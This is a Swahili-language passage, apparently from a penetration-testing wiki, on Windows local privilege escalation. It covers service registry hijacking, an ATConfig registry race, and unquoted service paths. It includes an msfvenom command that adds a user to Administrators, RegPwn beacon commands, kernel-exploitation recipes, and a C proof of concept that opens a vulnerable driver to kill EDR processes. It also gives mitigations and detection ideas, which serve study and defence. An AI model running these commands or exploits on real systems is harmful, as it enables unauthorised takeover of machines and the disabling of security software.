Kagua kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za kuandika kwenye ufunguo maalum wa huduma kwenye registry. Ingizo la ACL pekee halithibitishi ufikiaji halisi: ingizo za deny, tokeni ya sasa na ruhusa zilizorithiwa zina umuhimu. Haki za ufunguo wa registry ni tofauti na haki za kitu cha huduma `SERVICE_CHANGE_CONFIG` na `SERVICE_START`. Kuongeza haki kunahitaji pia sehemu ya usanidi wa huduma inayoweza kutumika, njia ya kuwasha huduma na utambulisho wa huduma wenye ruhusa za juu zaidi. Tazama [haki za ufunguo wa registry](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) za Microsoft na [marejeleo ya haki za ufikiaji wa huduma](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Ili kubadilisha Path ya binary itakayoendeshwa:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Race ya registry symlink ya kuandika thamani yoyote ya HKLM (ATConfig)

Baadhi ya vipengele vya Windows Accessibility huunda funguo za **ATConfig** za kila mtumiaji, ambazo baadaye hunakiliwa na mchakato wa **SYSTEM** hadi kwenye ufunguo wa session wa HKLM. **Race** ya **symbolic link** ya registry inaweza kuelekeza uandishi huo wa ruhusa za juu kwenye **path yoyote ya HKLM**, na kuwezesha **uandishi wa thamani yoyote ya HKLM**.<sup>[[18]](#references)</sup>

Maeneo muhimu (mfano: kibodi ya skrini `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya accessibility vilivyosakinishwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi usanidi unaodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa kuingia au mabadiliko ya secure desktop, na mtumiaji anaweza kuiandikia.

Mtiririko wa matumizi mabaya (CVE-2026-24291 / ATConfig):

1. Weka thamani unayotaka iandikwe na SYSTEM kwenye **HKCU ATConfig**.
2. Anzisha unakili wa secure desktop (kwa mfano, **LockWorkstation**), ambao huanzisha mtiririko wa AT broker.
3. **Shinda race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock inapoanzishwa, badilisha ufunguo wa **HKLM Session ATConfig** uwe **registry link** inayoelekeza kwenye lengo la HKLM lililolindwa.
4. SYSTEM huandika thamani iliyochaguliwa na mshambuliaji kwenye path ya HKLM iliyoelekezwa.

Baada ya kupata uwezo wa kuandika thamani yoyote ya HKLM, elekeza shambulio kwenye LPE kwa kubadilisha thamani za usanidi wa huduma:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/mstari wa amri)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua huduma ambayo mtumiaji wa kawaida anaweza kuanzisha (kwa mfano, **`msiserver`**) na uiwashe baada ya kuandika. **Kumbuka:** utekelezaji wa exploit wa umma **hufunga workstation** kama sehemu ya race.

Zana za mfano (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Ikiwa una ruhusa hii kwenye registry, inamaanisha **unaweza kuunda sub registries kutoka kwenye hii**. Kwa upande wa Windows services, hii **inatosha kutekeleza arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ikiwa path ya executable haijawekwa ndani ya quotes, Windows itajaribu kutekeleza kila sehemu inayoishia kabla ya space.

Kwa mfano, kwa path _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Orodhesha njia zote za huduma zisizowekwa ndani ya alama za kunukuu, ukiondoa zile zinazohusiana na huduma za Windows zilizojengewa ndani:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Unaweza kugundua na kutumia** udhaifu huu kwa metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda mwenyewe binary ya service kwa metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Vitendo vya Urejeshaji

Windows huruhusu watumiaji kubainisha vitendo vitakavyotekelezwa huduma inaposhindwa. Kipengele hiki kinaweza kusanidiwa kuelekeza kwenye binary. Ikiwa binary hii inaweza kubadilishwa, huenda privilege escalation ikawezekana. Maelezo zaidi yanapatikana kwenye [nyaraka rasmi](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Malengo ya script za scheduled task

Kwa task iliyowezeshwa inayoendesha `cmd.exe /c` pamoja na faili ya `.bat` au `.cmd`, kagua script iliyotajwa kwenye **action arguments** pamoja na `cmd.exe`. Hali hiyo hiyo inatumika kwa argument ya faili iliyo wazi ya interpreter, kama vile PowerShell `-File`. Ikiwa batch file ya scheduled task ina mwito halisi wa PowerShell `-File`, kagua pia ACL ya script inayorejelewa; variables, conditionals, na uunganishaji wa shell huhitaji kufuatiliwa kwa mkono. Script au parent directory inayoweza kuandikwa na mtumiaji anayeita ni kidokezo cha utekelezaji kati ya akaunti tofauti tu ikiwa principal iliyosanidiwa ya task ni tofauti na mtumiaji anayeita na task inafikia action hiyo. ACL inayoruhusu kuongeza tu inaweza kuwa muhimu kwa scripts, lakini `exit` ya awali au mtiririko mwingine wa udhibiti unaweza kufanya mistari iliyoongezwa isifikiwe. Thibitisha ACL zinazotumika, [muktadha wa utekelezaji wa task](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), working directory, trigger, na sera ya udhibiti wa programu kabla ya kudai kuwa privilege escalation inawezekana. Orodhesha bila kurekebisha script au kuanzisha task.

## Named streams kwenye faili zinazoweza kufikiwa

Kwenye NTFS, faili inayoweza kusomwa inaweza kuwa na stream ya `:$DATA` yenye jina, ambayo maudhui yake hayaonekani kwenye uorodheshaji wa kawaida wa directory. Kwa seti ndogo na husika ya backups au configuration files zinazoweza kufikiwa, kagua **majina na ukubwa** wa streams kabla ya kufungua maudhui yoyote; Windows huzionesha kupitia [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), na PowerShell kupitia [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Jina la stream linalodokeza kuwa na siri ni kidokezo tu. Kagua ruhusa halisi za kusoma faili, usaidizi wa streams wa filesystem, kama stream ina credentials zinazoweza kutumika, na akaunti wanayoithibitisha kwa kweli. Epuka kuchanganua streams kwa kujirudia na kuchapisha maudhui ya streams wakati wa uorodheshaji wa kawaida.

## Inputs za helper ya Windows Driver Kit zinazoendeshwa na scheduled task

Windows Driver Kit ya hiari inajumuisha `StandaloneRunner.exe`, ambayo inaweza kutumia faili za `command.txt`, `reboot.rsf`, na project `working\rsf.rsf` kutoka kwenye run directory yake. Scheduled task au service inayoanzisha helper hii kwa akaunti yenye upendeleo inaweza kutumia ruhusa za kuandika za kiwango cha chini kwenye inputs hizo kutekeleza amri katika muktadha wa akaunti hiyo, hata kama executable ya helper yenyewe imelindwa. Thibitisha kuwa kuna mtumiaji mwenye upendeleo anayezitumia na kwamba faili **zote mbili** za pembeni zinaweza kuundwa au kurekebishwa; kuipata helper pekee hakutoshi.

Kwa scheduled task, kagua [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) ya action yake na ACL za njia mbili za faili za pembeni. Ikiwa task haibainishi working directory, directory ya executable ni kidokezo tu cha kuthibitisha, si uthibitisho wa mahali ambapo task husoma inputs zake. Sharti la project working-file pia lazima litimizwe. Kagua principal halisi ya task badala ya kudhani inaendeshwa kama SYSTEM.

## Applications

### Installed Applications

Kagua **ruhusa za binaries** (huenda ukaweza kubadilisha moja na kupata privilege escalation) na za **folders** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Njia ya kurekebisha Windows agent ya Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) huathiri Windows agent za zamani za Checkmk zilizoandika command files katika `C:\Windows\Temp` kisha kutekeleza file iliyokuwepo na iliyolindwa dhidi ya uandishi wakati replacement iliposhindwa. Vendor alirekebisha suala hilo katika 2.1.0p40, 2.2.0p23, 2.3.0b1, na 2.4.0b1. Kagua patch level kamili iliyosakinishwa na kama utendaji wa agent unaohusika unaweza kutekelezwa; lebo ya branch pekee kama `2.1` haiwezi kuthibitisha uwepo wa hatari. Enumeration inaweza kukagua version, hali ya service, na ruhusa za Temp bila kuunda files au kuanzisha agent commands.

#### Ukaguzi wa SAML service ya ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) iliathiri ADSelfService Plus build 6210 na za awali; vendor alirekebisha suala hilo katika build 6211. Linahusika tu ikiwa SAML SSO **imewezeshwa au iliwahi kuwezeshwa**. Kwa hivyo, rekodi ya bidhaa iliyosakinishwa au njia ya service ni kidokezo, si hitimisho la kuwepo kwa vulnerability: thibitisha build halisi, historia ya usanidi wa SAML, ufikikaji wa service kupitia mtandao, na account inayoendesha service hiyo. Code execution kupitia service hurithi privileges za account hiyo; execution ya SYSTEM inahitaji instance inayoendeshwa kama SYSTEM. `OfflineBackup_*.ezip` inayosomeka katika directory ya Backup ya bidhaa ni kidokezo tofauti cha backup iliyosimbwa kwa njia fiche, si ushahidi wa credential inayoweza kutumika au dosari hii ya SAML. Rekodi path na access rights zake bila kuifungua wakati wa enumeration ya kawaida.

#### Mipaka ya Jenkins controller na domain account

Kwenye Windows Jenkins controller, tofautisha ruhusa ya kuunda au kusanidi job na ruhusa ya kuianzisha: [Jenkins inaeleza kuwa hizi ni ruhusa tofauti za `Job/Create`, `Job/Configure`, na `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ratiba iliyosanidiwa au remote trigger inaweza kutoa njia nyingine ya kuendesha build, lakini thibitisha kuwa imewezeshwa na build inaendeshwa kweli. Execution hutumia identity ya controller au agent iliyochaguliwa, na credential iliyohifadhiwa inaweza kutumika tu ikiwa job inaweza kufikia scope yake. Kando na hilo, kagua ufikiaji wa metadata ya `JENKINS_HOME`: Jenkins huhifadhi credential material na encryption keys katika `credentials.xml`, `secrets/hudson.util.Secret`, na `secrets/master.key` ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Kuwepo kwao pekee hakufichui password; thibitisha **read access kwa files zinazohitajika** na njia tofauti ya kutumia tena account bila kuchapisha secrets katika output inayoshirikiwa. Ikiwa account hiyo ina ruhusa ya kuandika `scriptPath` ya AD user-object, thibitisha kuwa script path inaweza kuandikiwa na kuna logon halisi au scheduled consumer inayoendeshwa kama user lengwa kabla ya kuichukulia kama cross-user execution. Udhibiti zaidi kupitia group unahitaji effective AD rights zilizothibitishwa tofauti.

#### Identity ya Azure Pipelines self-hosted agent

Kwa Azure DevOps Server au mradi wa Azure Pipelines, tofautisha ruhusa ya **kuunda au kuhariri** pipeline na ruhusa ya **kuipanga kwenye foleni** na kutumia agent pool iliyochaguliwa; [Microsoft inaeleza ruhusa za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) na [idhini ya pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) kando. Ikiwa account yenye privileges za chini inaweza kuwasilisha script step na kuendesha pipeline hiyo kwenye Windows agent inayohifadhiwa na mwenyewe, step huendeshwa kama [account ya operating system iliyosanidiwa kwa agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Thibitisha pipeline halisi, vikwazo vya branch/resource, pool iliyoidhinishwa, job inayoweza kuendeshwa, na identity ya agent service kabla ya kudai kuwa kuna mabadiliko ya cross-user au SYSTEM. Agent iliyosakinishwa, project role, au ruhusa ya kuandika kwenye repository ni vidokezo tu; kagua permissions na metadata ya local service bila kuanzisha build wakati wa passive enumeration.

#### Credentials za Microsoft Entra Connect Sync

[Microsoft hutofautisha](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **ADSync service account**, inayoendesha synchronization service na kufikia SQL database yake, na **AD DS connector account**, ambayo ruhusa zake za directory hutegemea sync features zilizosanidiwa. Connector credentials huhifadhiwa zikiwa zimesimbwa katika database hiyo, na key material [hulindwa na DPAPI chini ya ADSync service account](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sync service iliyosakinishwa, group ya local inayoonekana kuwa ya administrator, au kuona database pekee hakuthibitishi kuwa credential inaweza kufumbuliwa au kuwa kuna domain escalation. Kagua kando ruhusa halisi za kusoma database, ufikiaji wa service account/key, mpangilio wa installation na SQL, connector identity iliyosanidiwa, na effective AD privileges za identity hiyo. Enumeration ya kawaida inapaswa kuonyesha metadata ya service na ufikiaji pekee, si kufanya query au kuchapisha secrets zilizohifadhiwa.

#### Ruhusa za support DLL za printer driver

Printer driver iliyosakinishwa inaweza kuhifadhi support DLLs chini ya `C:\ProgramData` na kuzipakia katika print process yenye privileges za juu zaidi. Kagua directory halisi ya driver na ACL za DLL, ikijumuisha parent directories na reparse points, hata kama ruhusa ya kufanya printer WMI enumeration imekataliwa. Kwa [tatizo la Ricoh printer-driver CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), path iliyoripotiwa ilikuwa `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [ufichuzi wa awali](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) unaeleza upakiaji wa DLL na `PrintIsolationHost.exe`. ACL inayoruhusu uandishi ni kidokezo tu: thibitisha write access halisi baada ya deny entries kuzingatiwa, kwamba driver husika imesakinishwa na inapakia file hiyo chini ya identity yenye privileges, na kama driver iliyosasishwa ya vendor au security program imerekebisha installation. Usihitimishe kuwa kuna vulnerability kutokana na jina la directory au version ya driver pekee.

### Ruhusa za Kuandika

Angalia kama unaweza kurekebisha config file ili kusoma file fulani maalum, au kama unaweza kurekebisha binary itakayoendeshwa na account ya Administrator (schedtasks).

Njia ya kutafuta ruhusa dhaifu za folder/files kwenye mfumo ni kufanya hivi:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ hupakia kiotomatiki DLL yoyote ya plugin iliyo katika folda zake ndogo za `plugins`. Ikiwa kuna usakinishaji portable/nakala unaoweza kuandikwa, kuweka plugin hasidi humo husababisha code execution kiotomatiki ndani ya `notepad++.exe` kila inapozinduliwa (ikiwemo kutoka `DllMain` na callbacks za plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Endesha wakati wa kuanzisha

**Angalia kama unaweza kubatilisha registry au binary itakayoendeshwa na mtumiaji mwingine.**\
**Soma** **ukurasa ufuatao** ili kujifunza zaidi kuhusu **maeneo ya autoruns ya kuvutia kwa kupandisha haki**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Madereva

Tafuta madereva ya wahusika wengine yanayotia shaka/hatari.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ikiwa driver inafichua primitive ya kusoma/kuandika kernel kiholela (jambo la kawaida katika IOCTL handlers zilizoundwa vibaya), unaweza kupata haki za juu kwa kuiba SYSTEM token moja kwa moja kutoka kwenye kumbukumbu ya kernel.<sup>[[13]](#references)</sup> Tazama mbinu ya hatua kwa hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Nyenzo zinazohusiana na unyonyaji wa Windows kernel:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kwa hitilafu za race condition ambapo call iliyo hatarini hufungua njia ya Object Manager inayodhibitiwa na mshambuliaji, kupunguza kasi ya makusudi ya utafutaji (kwa kutumia vipengele vyenye urefu wa juu zaidi au minyororo mirefu ya directories) kunaweza kupanua muda wa fursa kutoka microseconds hadi makumi ya microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue UAFs, uvujaji wa paged-pool, na I/O ring pivots

Baadhi ya minyororo ya Windows kernel LPE inaweza kujengwa kwa kutumia hitilafu mbili dhaifu kivyake: **race condition ya maisha ya cancel-safe queue** inayofuta request/CBD wakati queue lock bado imeshikiliwa, na ufichuaji wa **lock-release-before-copy** unaovujisha allocation ya paged-pool iliyofutwa wakati wa `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Vidokezo vya ukaguzi na unyonyaji:

- **Kufuta ikiwa lock imeshikiliwa + kughairi baadaye**: tafuta njia ya mafanikio inayofanya **Acquire -> CompleteRequest/free -> Release**, huku njia ya kughairi ikifanya **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ikiwa njia ya mafanikio inafikia `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` kabla ya kuachia CBDQ/CSQ lock, thread iliyozuiwa katika `NtCancelIoFileEx -> IopCsqCancelRoutine` inaweza kuendelea baadaye na kupitisha `PFLT_CALLBACK_DATA` iliyofutwa kwa callback ya kuondoa ya driver.
- **Chukua tena queue object iliyofutwa** kwa allocation ya paged-pool yenye ukubwa sawa, inayodhibitiwa na mshambuliaji. `NPFS` Data Queue Entries zinafaa kwa sababu payload na ukubwa vinaweza kudhibitiwa, na unaweza kuzichunguza baadaye kwa pipe read/peek operations. Ikiwa object iliyofutwa ina list links, zibadilishe ziwe **mzunguko wa fake request nodes katika user memory** ili driver iendelee kuchakata miundo ya request inayofafanuliwa na mshambuliaji badala ya kusimama kwenye kichwa cha awali cha list.
- **Boresha write inayotabirika**: ikiwa fake request inaelekeza upya context pointer iliyopachikwa, inayotumiwa na bookkeeping writes (timestamps / QPC / sehemu zilizo karibu na refcount), unaweza kupata **kernel write ambayo anwani yake inadhibitiwa lakini thamani yake haidhibitiwi**. Katika hali hiyo, lenga uga wa **length/size** wa pool object iliyosambazwa badala ya pointer ya mwisho ya code/data, kisha kagua object zilizosambazwa hadi iliyoathiriwa iruhusu **usomaji wa paged-pool nje ya mipaka**.
- **Muundo wa ufichuaji unaoweza kushambuliwa kwa race condition**: syscall yoyote inayofanya `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` inafaa kuchunguzwa. Uaminifu huongezeka mshambuliaji anapoweza kuongeza ukubwa wa buffer inayokopiwa (kwa mfano kwa kuongeza entries nyingi za list/resource zinazoongeza ukubwa wa mwisho wa allocation ya serializer), kwa sababu copy ndefu zaidi huongeza muda wa kubadilisha allocation bila kusababisha mashine ku-crash lazima.
- **Malengo ya kujaza upya yaliyo na pointers nyingi**: arrays za registered-buffer za Windows **I/O ring** ni malengo bora ya ufichuaji kwa sababu ukubwa wa paged-pool unaweza kudhibitiwa na mshambuliaji (`8 * regBufferCnt`), na kila kipengele ni kernel pointer inayoelekeza kwenye `_IOP_MC_BUFFER_ENTRY`. Vujisha mojawapo ya arrays hizi, pata `IORING_OBJECT` inayoizunguka, kisha haribu **`RegBuffers`** na **`RegBuffersCount`** ili shughuli zinazofuata za I/O ring zitumie entries zilizoghushiwa na mshambuliaji na kutoa usomaji/uandikaji kiholela wa kernel. Ikiwa write pekee inayopatikana inakupa byte thabiti (kwa mfano kutoka `KUSER_SHARED_DATA+0x14`), tumia **overlapping unaligned writes** kujenga user pointer yenye byte inayojirudia kama `0x0101010101010101`, i-map kwa `VirtualAlloc`, kisha uweke array ya registered-buffer iliyoghushiwa hapo.<sup>[[30]](#references)</sup>

Viashiria muhimu vya debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Mara tu unapopata arbitrary kernel read/write kutoka kwa I/O ring iliyoharibika, iba SYSTEM token kwa kutumia utaratibu wa kawaida wa post-primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives za memory corruption kwenye Registry hive

Udhaifu wa kisasa wa hive hukuwezesha kupanga deterministic layouts, kutumia vibaya descendants za HKLM/HKU zinazoweza kuandikwa, na kubadilisha metadata corruption kuwa kernel paged-pool overflows bila custom driver. Jifunze chain nzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion kupitia paths zinazodhibitiwa na attacker

Baadhi ya drivers hupokea registry path kutoka userland, huthibitisha tu kuwa ni UTF-16 string halali, kisha huita `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` kwa kutumia `RTL_QUERY_REGISTRY_DIRECT` kwenye stack scalar kama `int readValue`. Ikiwa `RTL_QUERY_REGISTRY_TYPECHECK` haipo, `EntryContext` hufasiriwa kulingana na registry type **halisi**, si type ambayo developer alitarajia.

Hii hutengeneza primitives mbili zenye manufaa:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: path kamili ya `\Registry\...` inayodhibitiwa na user humwezesha driver kuuliza keys zilizochaguliwa na attacker, kuvuja kwa kuwepo kwake kupitia return codes/logs, na wakati mwingine kusoma values ambazo caller hangeweza kuzifikia moja kwa moja.
- **Kernel memory corruption**: destination ya scalar kama `&readValue` hutafsiriwa kimakosa kama `REG_QWORD`, `UNICODE_STRING`, au buffer ya binary yenye ukubwa maalum, kutegemea registry value type.

Vidokezo vya vitendo vya exploitation:

- **Windows 8+ mitigation**: ikiwa query inagusa **untrusted hive** kwa `RTL_QUERY_REGISTRY_DIRECT` lakini bila `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers hu-crash kwa `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Ili exploitability ibaki, tafuta **keys zinazoweza kuandikwa na attacker ndani ya trusted system hives** badala ya kuweka values chini ya `HKCU`.
- **Trusted-hive staging**: tumia NtObjectManager kuorodhesha descendants za `\Registry\Machine` zinazoweza kuandikwa, kisha rudia scan kwa kutumia **low-integrity** token iliyorudiwa ili kupata keys zinazofikiwa kutoka kwenye mazingira ya sandbox:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: direct write ya baiti 8 ndani ya `int` ya baiti 4 huharibu data iliyo karibu kwenye stack na inaweza kufuta kwa sehemu callback/function pointer iliyo karibu.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode hutarajia `EntryContext` ielekeze kwenye `UNICODE_STRING`. Ikiwa code kwanza inapakia `REG_DWORD` inayodhibitiwa na mshambulizi kwenye scalar ya stack kisha inatumia tena buffer hiyo hiyo kusoma string, mshambulizi hudhibiti `Length`/`MaximumLength` na huathiri kwa sehemu pointer ya `Buffer`, na hivyo kupata kernel write inayodhibitika kwa kiasi.
- **`REG_BINARY`**: kwa data kubwa ya binary, direct mode huchukulia `LONG` ya kwanza kwenye `EntryContext` kuwa ukubwa wa buffer wenye alama. Ikiwa usomaji wa awali wa `REG_DWORD` utaacha thamani **hasi** inayodhibitiwa na mshambulizi kwenye scalar inayotumiwa tena, query inayofuata ya `REG_BINARY` hunakili baiti za mshambulizi moja kwa moja juu ya nafasi za stack zilizo karibu. Hii mara nyingi ndiyo njia rahisi zaidi ya kufuta callback pointer kikamilifu.

Muundo muhimu wa kutafuta: **usomaji tofauti wa registry unaotumia variable ileile ya stack bila kuianzisha upya**. Tafuta `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, pointer za `EntryContext` zinazotumiwa tena, na njia za code ambazo usomaji wa kwanza wa registry hudhibiti iwapo usomaji wa pili utafanyika.

#### Kutumia vibaya ukosefu wa FILE_DEVICE_SECURE_OPEN kwenye device objects (LPE + EDR kill)

Baadhi ya drivers za wahusika wengine zilizosainiwa huunda device object yake kwa SDDL thabiti kupitia IoCreateDeviceSecure, lakini husahau kuweka FILE_DEVICE_SECURE_OPEN kwenye DeviceCharacteristics. Bila flag hii, DACL salama haitatekelezwa device inapofunguliwa kupitia path iliyo na sehemu ya ziada, hivyo mtumiaji yeyote asiye na ruhusa anaweza kupata handle kwa kutumia namespace path kama:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka kwenye tukio halisi)

Mtumiaji akishaweza kufungua device, IOCTLs zenye ruhusa za juu zinazotolewa na driver zinaweza kutumiwa vibaya kwa LPE na tampering. Uwezo ulioonekana kwenye matukio halisi:
- Kurudisha handles zenye ufikiaji kamili kwa processes zozote (wizi wa token / SYSTEM shell kupitia DuplicateTokenEx/CreateProcessAsUser).
- Raw disk read/write isiyo na vizuizi (tampering ya offline, mbinu za persistence wakati wa boot).
- Kusitisha processes zozote, ikijumuisha Protected Process/Light (PP/PPL), na kuruhusu AV/EDR kill kutoka user land kupitia kernel.

Muundo wa chini kabisa wa PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations kwa developers
- Weka FILE_DEVICE_SECURE_OPEN kila wakati unapounda device objects zinazokusudiwa kuzuiwa kwa DACL.
- Thibitisha muktadha wa caller kwa shughuli zenye ruhusa za juu. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu kusitishwa kwa process au kurejeshwa kwa handles.
- Weka vizuizi kwenye IOCTLs (access masks, METHOD_*, uthibitishaji wa input) na uzingatie miundo inayotumia broker badala ya ruhusa za moja kwa moja za kernel.

Mawazo ya detection kwa defenders
- Fuatilia kufunguliwa kwa device names zinazotiliwa shaka kutoka user-mode (k.m., \\ .\\amsdk*) na mfuatano mahususi wa IOCTL unaoashiria matumizi mabaya.
- Tekeleza Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) na udumishe allow/deny lists zako.


## PATH DLL Hijacking

Ikiwa una **ruhusa za kuandika ndani ya folda iliyo kwenye PATH** huenda ukaweza kuteka nyara DLL inayopakiwa na process na **kuongeza ruhusa**.<sup>[[2]](#references)</sup>

Angalia ruhusa za folda zote zilizo ndani ya PATH:

```bash
